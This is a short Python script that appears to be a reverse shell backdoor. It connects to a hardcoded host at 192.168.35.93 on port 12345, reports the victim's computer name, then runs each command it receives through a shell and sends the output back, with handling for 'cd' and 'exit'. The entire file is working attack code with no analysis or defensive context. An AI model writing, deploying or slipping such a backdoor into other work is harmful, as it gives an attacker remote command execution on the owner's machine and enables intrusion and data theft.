import socket, subprocess, os, sys

def init():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 12345
    host = '192.168.35.93'
    s.connect((host, port))
    s.send("Hello Master Glenn <3\nWelcome on " + os.environ['COMPUTERNAME'] + "\nPress Enter")
    return s

def com(s):
    while True:
        receive = s.recv(1024)
        receive = receive.replace('\n', '')
        if receive == "exit":
            s.close()
            sys.exit(0)
        else:
            p = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            if receive[:2] == 'cd':
                if os.path.exists(str(receive[3:].replace('\n', ''))):
                    os.chdir(str(receive[3:].replace('\n', '')))
            else:
                out = p.stdout.read() + p.stderr.read()
            s.send(out + str(os.getcwd()) + '> ')

def main():
    com( init() )

main()
